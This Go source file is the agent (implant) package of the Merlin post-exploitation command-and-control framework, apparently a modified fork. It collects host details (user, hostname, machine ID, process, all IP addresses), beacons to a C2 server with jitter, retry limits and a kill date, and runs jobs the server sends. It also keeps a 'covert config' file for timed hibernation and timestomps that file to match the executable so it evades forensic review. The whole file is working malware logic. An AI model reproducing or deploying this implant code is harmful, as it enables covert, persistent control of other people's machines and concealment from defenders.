// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/denisbrodbeck/machineid"
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients"
	"github.com/Ne0nd0g/merlin/pkg/agent/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES
var build = "Release" // build is the build number of the Merlin Agent program set at compile time

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID                 uuid.UUID               // ID is a Universally Unique Identifier per agent
	Client             clients.ClientInterface // Client is an interface for clients to make connections for agent communications
	Platform           string                  // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture       string                  // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName           string                  // UserName is the username that the agent is running as
	UserGUID           string                  // UserGUID is a Globally Unique Identifier associated with username
	HostName           string                  // HostName is the computer's host name
	MachineID          string                  // MachineID is the computer's unique identifer
	Ips                []string                // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid                int                     // Pid is the Process ID that the agent is running under
	Process            string                  // Process is this agent's process name in memory
	iCheckIn           time.Time               // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn           time.Time               // sCheckIn is a timestamp of the agent's last status check in time
	Version            string                  // Version is the version number of the Merlin Agent program
	Build              string                  // Build is the build number of the Merlin Agent program
	WaitTimeMin        int64                   // WaitTimeMin is shortest amount of time in which the agent waits in-between checking in
	WaitTimeMax        int64                   // WaitTimeMax is longest amount of time in which the agent waits in-between checking in
	InactiveCount      int                     // InactiveCount is a count of the total number of check ins with no commands
	InactiveMultiplier int64                   // InactiveMultipler is the amount to multiply WaitTime(Min/Max) by when agent goes inactive
	InactiveThreshold  int                     // InactiveThreshold is the number of check ins with no commands before an agent goes inactive
	ActiveMin          int64                   // ActiveMin keeps track of the originally configured WaitTimeMin
	ActiveMax          int64                   // ActiveMax keeps track of the originally configured WaitTimeMax
	MaxRetry           int                     // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin      int                     // FailedCheckin is a count of the total number of failed check ins
	Initial            bool                    // Initial identifies if the agent has successfully completed the first initial check in
	KillDate           int64                   // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
	CovertConfig       string                  // CovertConfig is the path to the file on disk used store the persistent hibernate sleeps
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Agent
type Config struct {
	WaitTimeMin        int64  // WaitTimeMin is the minimum amount of time the Agent will wait between sending messages to the server
	WaitTimeMax        int64  // WaitTimeMax is the maximum amount of time the Agent will wait between sending messages to the server
	InactiveMultiplier int64  // InactiveMultipler is the amount to multiply WaitTime(Min/Max) by when agent goes inactive
	InactiveThreshold  int    // InactiveThreshold is the number of check ins with no commands before an agent goes inactive
	KillDate           string // KillDate is the date, as a Unix timestamp, that agent will quit running
	MaxRetry           string // MaxRetry is the maximum amount of time an agent will fail to check in before it quits running
	CovertConfig       string // CovertConfig is the path to the file on disk used store the persistent hibernate sleeps
}

// New creates a new agent struct with specific values and returns the object
func New(config Config) (*Agent, error) {
	cli.Message(cli.DEBUG, "Entering agent.New() function")

	agent := Agent{
		ID:           uuid.NewV4(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		Version:      core.Version,
		Initial:      false,
	}

	rand.Seed(time.Now().UnixNano())

	u, errU := user.Current()
	if errU != nil {
		return &agent, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
	}

	agent.UserName = u.Username
	agent.UserGUID = u.Gid

	h, errH := os.Hostname()
	if errH != nil {
		return &agent, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
	}

	agent.HostName = h

	mID, errM := machineid.ID()
	if errM != nil {
		var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
		var charset string = "ABCDEF0123456789"
		b := make([]byte, 16)
		for i := range b {
			b[i] = charset[seededRand.Intn(len(charset))]
		}
		mID = string(b)
	}

	agent.MachineID = mID

	p, errP := os.Executable()
	if errP != nil {
		return &agent, fmt.Errorf("there was an error getting the process name:\r\n%s", errH)
	}

	agent.Process = p

	interfaces, errI := net.Interfaces()
	if errI != nil {
		return &agent, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				agent.Ips = append(agent.Ips, addr.String())
			}
		} else {
			return &agent, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
		}
	}

	// Parse config
	var err error
	// Parse KillDate
	if config.KillDate != "" {
		agent.KillDate, err = strconv.ParseInt(config.KillDate, 10, 64)
		if err != nil {
			return &agent, fmt.Errorf("there was an error converting the killdate to an integer:\r\n%s", err)
		}
	} else {
		//18 digit max
		StrKillDate := "000000000000000000"
		IntKillDate, _ := strconv.ParseInt(StrKillDate, 10, 64)
		agent.KillDate = IntKillDate
	}
	// Parse MaxRetry
	if config.MaxRetry != "" {
		agent.MaxRetry, err = strconv.Atoi(config.MaxRetry)
		if err != nil {
			return &agent, fmt.Errorf("there was an error converting the max retry to an integer:\r\n%s", err)
		}
	} else {
		//18 digit max
		StrMaxRetry := "555555555555555555"
		IntMaxRetry, _ := strconv.Atoi(StrMaxRetry)
		agent.MaxRetry = IntMaxRetry
	}
	// Parse WaitTimeMin
	if config.WaitTimeMin != 0 {
		agent.WaitTimeMin = config.WaitTimeMin
	} else {
		//18 digit max
		StrWaitTimeMin := "999999999999999999"
		IntWaitTimeMin, _ := strconv.ParseInt(StrWaitTimeMin, 10, 64)
		agent.WaitTimeMin = IntWaitTimeMin
	}
	// Parse WaitTimeMax
	if config.WaitTimeMax != 0 {
		agent.WaitTimeMax = config.WaitTimeMax
	} else {
		//18 digit max
		StrWaitTimeMax := "888888888888888888"
		IntWaitTimeMax, _ := strconv.ParseInt(StrWaitTimeMax, 10, 64)
		agent.WaitTimeMax = IntWaitTimeMax
	}
	// Parse InactiveMultiplier
	if config.InactiveMultiplier != 0 {
		agent.InactiveMultiplier = config.InactiveMultiplier
	} else {
		//18 digit max
		StrInactiveMultiplier := "777777777777777777"
		IntInactiveMultiplier, _ := strconv.ParseInt(StrInactiveMultiplier, 10, 64)
		agent.InactiveMultiplier = IntInactiveMultiplier
	}
	// Parse InactiveThreshold
	if config.InactiveThreshold != 0 {
		agent.InactiveThreshold = config.InactiveThreshold
	} else {
		//18 digit max
		StrInactiveThreshold := "666666666666666666"
		IntInactiveThreshold, _ := strconv.Atoi(StrInactiveThreshold)
		agent.InactiveThreshold = IntInactiveThreshold
	}
	// Covert Config
	if config.CovertConfig != "" {
		agent.CovertConfig = config.CovertConfig
	} else {
		//200 character max
		StrCovertConfigPre := "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
		StrCovertConfigPost := strings.Trim(StrCovertConfigPre, " ")
		agent.CovertConfig = StrCovertConfigPost
	}

	agent.ActiveMin = agent.WaitTimeMin
	agent.ActiveMax = agent.WaitTimeMax
	agent.InactiveCount = 0

	cli.Message(cli.INFO, "Host Information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tAgent UUID: %s", agent.ID))
	cli.Message(cli.INFO, fmt.Sprintf("\tPlatform: %s", agent.Platform))
	cli.Message(cli.INFO, fmt.Sprintf("\tArchitecture: %s", agent.Architecture))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser Name: %s", agent.UserName)) //TODO A username like _svctestaccont causes error
	cli.Message(cli.INFO, fmt.Sprintf("\tUser GUID: %s", agent.UserGUID))
	cli.Message(cli.INFO, fmt.Sprintf("\tHostname: %s", agent.HostName))
	cli.Message(cli.INFO, fmt.Sprintf("\tMachine ID: %s", agent.MachineID))
	cli.Message(cli.INFO, fmt.Sprintf("\tProcess: %s", agent.Process))
	cli.Message(cli.INFO, fmt.Sprintf("\tPID: %d", agent.Pid))
	cli.Message(cli.INFO, fmt.Sprintf("\tIPs: %v", agent.Ips))
	cli.Message(cli.DEBUG, "Leaving agent.New function")

	return &agent, nil
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
	rand.Seed(time.Now().UTC().UnixNano())

	cli.Message(cli.NOTE, fmt.Sprintf("Agent version: %s", a.Version))
	cli.Message(cli.NOTE, fmt.Sprintf("Agent build: %s", build))

	// Verify the agent's kill date hasn't been exceeded
	if (a.KillDate != 0) && (time.Now().Unix() >= a.KillDate) {
		cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
		os.Exit(0)
	}

	// Check for the covert config
	_, err := os.Stat(a.CovertConfig)

	// Create if it doesn't exist
	if os.IsNotExist(err) {
		file, err2 := os.Create(a.CovertConfig)
		if err2 == nil {
			cli.Message(cli.NOTE, fmt.Sprintf("Covert config successfully created: %s", a.CovertConfig))
			file.WriteString("0000000000")
			file.Close()

			//Touch match the file to the agent executable if possible
			exepath, err3 := os.Executable()
			if err3 == nil {
				exepathfile, err4 := os.Stat(exepath)
				if err4 != nil {
					cli.Message(cli.WARN, fmt.Sprintf("Unable to stat agent executable: %s", err4.Error()))
				} else {
					modifiedtime := exepathfile.ModTime()
					err5 := os.Chtimes(a.CovertConfig, modifiedtime, modifiedtime)
					if err5 != nil {
						cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err5.Error()))
					} else {
						cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", modifiedtime))
					}
				}
			} else {
				cli.Message(cli.WARN, fmt.Sprintf("Failed to locate agent executable path: %s", err3.Error()))
			}
		} else {
			cli.Message(cli.WARN, fmt.Sprintf("Error creating covert config: %s", err2.Error()))
		}
	} else {
		cli.Message(cli.NOTE, fmt.Sprintf("Covert config detected: %s", a.CovertConfig))
		// Attempt to read the covert config
		covertconfigcontent, err6 := ioutil.ReadFile(a.CovertConfig)
		if err6 == nil {
			if string(covertconfigcontent) == "0000000000" {
				cli.Message(cli.NOTE, fmt.Sprintf("Covert config content is the default, continue."))
			} else {
				// A date might be in the convert config!
				int64convertconfig, err7 := strconv.ParseInt(string(covertconfigcontent), 10, 64)
				if err7 == nil {
					covertconfigdate := time.Unix(int64convertconfig, 0)
					differenceintime := covertconfigdate.Sub(time.Now())
					if int(differenceintime.Seconds()) > 0 {
						cli.Message(cli.NOTE, fmt.Sprintf("Hibernation date is in the future! Sleeping for %d seconds", int(differenceintime.Seconds())))
						// Sleep until specified hibernation time
						time.Sleep(differenceintime)

						// Get the file's touch time
						origcovertconfigtimefile, err8 := os.Stat(a.CovertConfig)
						var origcovertconfigtime time.Time
						if err8 != nil {
							cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err8.Error()))
							origcovertconfigtime = time.Unix(0, 0)
						} else {
							origcovertconfigtime = origcovertconfigtimefile.ModTime()
						}

						// Set the default contents back
						err9 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
						if err9 == nil {
							cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
							// Touch it back
							if origcovertconfigtime != time.Unix(0, 0) {
								err10 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
								if err10 != nil {
									cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err10.Error()))
								} else {
									cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
								}
							}
						} else {
							cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err9.Error()))
						}
					} else {
						cli.Message(cli.WARN, fmt.Sprintf("Hibernation date is in the past or the covert config was corrupt"))
						// Get the file's touch time
						origcovertconfigtimefile, err11 := os.Stat(a.CovertConfig)
						var origcovertconfigtime time.Time
						if err11 != nil {
							cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err11.Error()))
							origcovertconfigtime = time.Unix(0, 0)
						} else {
							origcovertconfigtime = origcovertconfigtimefile.ModTime()
						}

						// Set the default contents back
						err12 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
						if err12 == nil {
							cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
							// Touch it back
							if origcovertconfigtime != time.Unix(0, 0) {
								err13 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
								if err13 != nil {
									cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err13.Error()))
								} else {
									cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
								}
							}
						} else {
							cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err12.Error()))
						}
					}
				} else {
					cli.Message(cli.WARN, fmt.Sprintf("Covert config contents likely corrupted: %s", err7.Error()))
					// Get the file's touch time
					origcovertconfigtimefile, err14 := os.Stat(a.CovertConfig)
					var origcovertconfigtime time.Time
					if err14 != nil {
						cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err14.Error()))
						origcovertconfigtime = time.Unix(0, 0)
					} else {
						origcovertconfigtime = origcovertconfigtimefile.ModTime()
					}

					// Set the default contents back
					err15 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
					if err15 == nil {
						cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
						// Touch it back
						if origcovertconfigtime != time.Unix(0, 0) {
							err16 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
							if err16 != nil {
								cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err16.Error()))
							} else {
								cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
							}
						}
					} else {
						cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err15.Error()))
					}
				}
			}
		} else {
			cli.Message(cli.WARN, fmt.Sprintf("Unable to read covert config: %s", err6.Error()))
		}
	}

	for {
		// Verify the agent's kill date hasn't been exceeded
		if (a.KillDate != 0) && (time.Now().Unix() >= a.KillDate) {
			cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
			os.Exit(0)
		}

		// Check in
		if a.Initial {
			cli.Message(cli.NOTE, "Checking in...")
			a.statusCheckIn()
		} else {
			msg, err := a.Client.Initial(a.getAgentInfoMessage())
			if err != nil {
				a.FailedCheckin++
				inactiveCheckin(a)
				cli.Message(cli.WARN, err.Error())
				cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
			} else {
				a.messageHandler(msg)
				a.Initial = true
				a.iCheckIn = time.Now().UTC()
			}
		}
		// Determine if the max number of failed checkins has been reached
		if a.FailedCheckin >= a.MaxRetry {
			cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d", a.MaxRetry))
			os.Exit(0)
		}
		// Sleep
		var totalWaitTime time.Duration
		if a.WaitTimeMin != a.WaitTimeMax {
			rand.Seed(time.Now().UnixNano())
			totalWaitTimeInt := rand.Int63n(a.WaitTimeMax-a.WaitTimeMin) + a.WaitTimeMin
			totalWaitTime = time.Duration(totalWaitTimeInt) * time.Second
		} else {
			totalWaitTime = time.Duration(a.WaitTimeMax) * time.Second
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
		time.Sleep(totalWaitTime)
	}
}

// statusCheckIn is the function that agent runs at every sleep/skew interval to check in with the server for jobs
func (a *Agent) statusCheckIn() {
	cli.Message(cli.DEBUG, "Entering into agent.statusCheckIn()")

	msg := getJobs()
	msg.ID = a.ID

	j, reqErr := a.Client.SendMerlinMessage(msg)

	if reqErr != nil {
		a.FailedCheckin++
		inactiveCheckin(a)
		cli.Message(cli.WARN, reqErr.Error())
		cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))

		// Put the jobs back into the queue if there was an error
		if msg.Type == messages.JOBS {
			a.messageHandler(msg)
		}
		return
	}

	a.FailedCheckin = 0
	a.sCheckIn = time.Now().UTC()

	cli.Message(cli.DEBUG, fmt.Sprintf("Agent ID: %s", j.ID))
	cli.Message(cli.DEBUG, fmt.Sprintf("Message Type: %s", messages.String(j.Type)))
	cli.Message(cli.DEBUG, fmt.Sprintf("Message Payload: %+v", j.Payload))

	// Handle message
	a.messageHandler(j)

}

func inactiveCheckin(a *Agent) {
	a.InactiveCount++
	if a.InactiveCount == a.InactiveThreshold {
		a.InactiveCount = 0
		a.WaitTimeMin *= a.InactiveMultiplier
		a.WaitTimeMax *= a.InactiveMultiplier
	}
}

// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
